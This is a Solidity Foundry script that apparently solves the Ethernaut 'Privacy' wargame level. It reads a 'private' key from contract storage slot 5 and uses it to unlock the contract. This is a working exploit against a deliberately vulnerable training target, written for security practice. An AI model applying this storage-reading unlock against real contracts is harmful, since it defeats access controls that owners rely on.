// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { Privacy } from "src/Level12.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = uint256(vm.envBytes32("DEPLOYER_PRIVATE_KEY"));
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance{ value: 0.001 ether }(0x131c3249e115491E83De375171767Af07906eA36);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);
        Privacy instance = Privacy(instanceAddress);

        // slot 0: bool public locked;
        // slot 1: uint256 public ID;
        // slot 2: uint8 + uint8 + uint16
        // slot 3: bytes32
        // slot 4: bytes32
        // slot 5: bytes32 <-- our secret
        bytes32 secret = vm.load(instanceAddress, bytes32(uint256(5)));
        bytes16 secret16 = bytes16(secret);
        instance.unlock(secret16);
        console2.log(instance.locked());

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
